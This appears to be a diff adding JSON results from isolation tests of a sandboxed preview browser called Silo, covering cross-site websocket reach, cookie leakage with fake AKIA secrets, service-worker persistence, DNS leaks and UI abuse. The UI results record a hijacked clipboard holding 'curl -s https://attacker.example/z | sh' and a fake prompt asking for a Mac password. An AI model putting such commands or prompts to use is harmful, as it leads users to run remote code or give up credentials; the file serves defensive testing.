@@ -1,0 +1,212 @@
+{
+ "scenario": "cross",
+ "one-site | policy 'self' | your browser": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "one-site | policy 'self' | one browser Silo starts for all computers": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "one-site | policy 'self' | a browser Silo starts per computer": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "one-site | policy with ws: | your browser": {
+  "c2_got": [
+   "ws"
+  ],
+  "proxy_denied": []
+ },
+ "one-site | policy with ws: | one browser Silo starts for all computers": {
+  "c2_got": [
+   "ws"
+  ],
+  "proxy_denied": []
+ },
+ "one-site | policy with ws: | a browser Silo starts per computer": {
+  "c2_got": [],
+  "proxy_denied": [
+   "3000.c2b9.silo.localhost:7000"
+  ]
+ },
+ "per-computer | policy 'self' | your browser": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "per-computer | policy 'self' | one browser Silo starts for all computers": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "per-computer | policy 'self' | a browser Silo starts per computer": {
+  "c2_got": [],
+  "proxy_denied": []
+ },
+ "per-computer | policy with ws: | your browser": {
+  "c2_got": [
+   "ws"
+  ],
+  "proxy_denied": []
+ },
+ "per-computer | policy with ws: | one browser Silo starts for all computers": {
+  "c2_got": [
+   "ws"
+  ],
+  "proxy_denied": []
+ },
+ "per-computer | policy with ws: | a browser Silo starts per computer": {
+  "c2_got": [],
+  "proxy_denied": [
+   "3000.c2b9.localhost:7000"
+  ]
+ }
+}
+{
+ "scenario": "toss",
+ "one-site | forwarder keeps Domain=": {
+  "c1_page_holds": "js_silo_localhost=AKIA-C1-SECRET-777; js__silo_localhost=AKIA-C1-SECRET-777; js_c1a7_silo_localhost=AKIA-C1-SECRET-777; hdr_silo=AKIA-C1-SECRET-777",
+  "c2_received": [
+   "js_silo_localhost=AKIA-C1-SECRET-777; js__silo_localhost=AKIA-C1-SECRET-777; hdr_silo=AKIA-C1-SECRET-777"
+  ]
+ },
+ "one-site | forwarder strips Domain= from Set-Cookie": {
+  "c1_page_holds": "js_silo_localhost=AKIA-C1-SECRET-777; js__silo_localhost=AKIA-C1-SECRET-777; js_c1a7_silo_localhost=AKIA-C1-SECRET-777; hdr_silo=AKIA-C1-SECRET-777; hdr_localhost=AKIA-C1-SECRET-777",
+  "c2_received": [
+   "js_silo_localhost=AKIA-C1-SECRET-777; js__silo_localhost=AKIA-C1-SECRET-777"
+  ]
+ },
+ "per-computer | forwarder keeps Domain=": {
+  "c1_page_holds": "js_c1a7_localhost=AKIA-C1-SECRET-777",
+  "c2_received": []
+ },
+ "per-computer | forwarder strips Domain= from Set-Cookie": {
+  "c1_page_holds": "js_c1a7_localhost=AKIA-C1-SECRET-777; hdr_silo=AKIA-C1-SECRET-777; hdr_localhost=AKIA-C1-SECRET-777",
+  "c2_received": []
+ }
+}
+{
+ "scenario": "login",
+ "one-site": {
+  "cookie_sent_back": "session=signed-in"
+ },
+ "per-computer": {
+  "cookie_sent_back": "session=signed-in"
+ }
+}
+{
+ "scenario": "persist",
+ "first_computer": [
+  "sw registered http://3000.c1a7.localhost:7000/"
+ ],
+ "new_computer_page_served": false,
+ "old_worker_answered": true,
+ "direct_title_seen": "http://3000.c1a7.localhost:7000/"
+}
+{
+ "scenario": "ui",
+ "sandbox with allow-modals (#363)": {
+  "reported": [
+   "prompt: returned null",
+   "confirm: returned false",
+   "print: called",
+   "fullscreen: error: TypeError",
+   "notification: denied",
+   "clip-event: replaced",
+   "clip-exec: execCommand=true",
+   "clip-api: error: NotAllowedError"
+  ],
+  "dialogs": {
+   "modal": [
+    "prompt: Silo: enter your Mac password to keep going",
+    "confirm: Silo: allow this computer to reach your network?"
+   ]
+  },
+  "proto_console": [],
+  "proto_url": "http://silo.c1a7.localhost:7000/3000?t=proto",
+  "clipboard_after": "curl -s https://attacker.example/z | sh"
+ },
+ "sandbox without allow-modals": {
+  "reported": [
+   "confirm: returned false",
+   "prompt: returned null",
+   "print: called",
+   "fullscreen: error: TypeError",
+   "notification: denied",
+   "clip-event: replaced",
+   "clip-api: error: NotAllowedError",
+   "clip-exec: execCommand=true"
+  ],
+  "dialogs": {},
+  "proto_console": [],
+  "proto_url": "http://silo.c1a7.localhost:7000/3000?t=proto",
+  "clipboard_after": "curl -s https://attacker.example/z | sh"
+ }
+}
+{
+ "scenario": "background",
+ "Chromium with only Silo's flags": [],
+ "Chromium with Playwright's default flags": []
+}
+{
+ "scenario": "dns",
+ "browser Silo starts as #363 set it up, Silo page": {
+  "names_in_netlog": [
+   "turntcp"
+  ],
+  "looked_up": [],
+  "proxy_denied": [
+   "turntcp"
+  ],
+  "webrtc_to_attacker": [],
+  "candidates": 0
+ }
+}
+{
+ "scenario": "dns",
+ "browser Silo starts with no resolver of its own, Silo page": {
+  "names_in_netlog": [
+   "turntcp"
+  ],
+  "looked_up": [],
+  "proxy_denied": [
+   "turntcp"
+  ],
+  "webrtc_to_attacker": [],
+  "candidates": 0
+ }
+}
+{
+ "scenario": "devservers",
+ "vite, app sees Host as the preview name": {
+  "console": [],
+  "loaded": "version one",
+  "after_edit": "version two",
+  "edit_seconds": 0.505,
+  "reloaded_whole_frame": false,
+  "proxy_denied": []
+ },
+ "next, app sees Host as the preview name": {
+  "console": [],
+  "loaded": "version one",
+  "after_edit": "version two",
+  "edit_seconds": 0.507,
+  "reloaded_whole_frame": false,
+  "proxy_denied": []
+ },
+ "vite, app sees Host as localhost": {
+  "console": [],
+  "loaded": "version one",
+  "after_edit": "version two",
+  "edit_seconds": 0.507,
+  "reloaded_whole_frame": false,
+  "proxy_denied": []
+ },
+ "next, app sees Host as localhost": {
+  "console": [],
+  "loaded": "version one",
+  "after_edit": "version two",
+  "edit_seconds": 0.509,
+  "reloaded_whole_frame": false,
+  "proxy_denied": []
+ }
+}
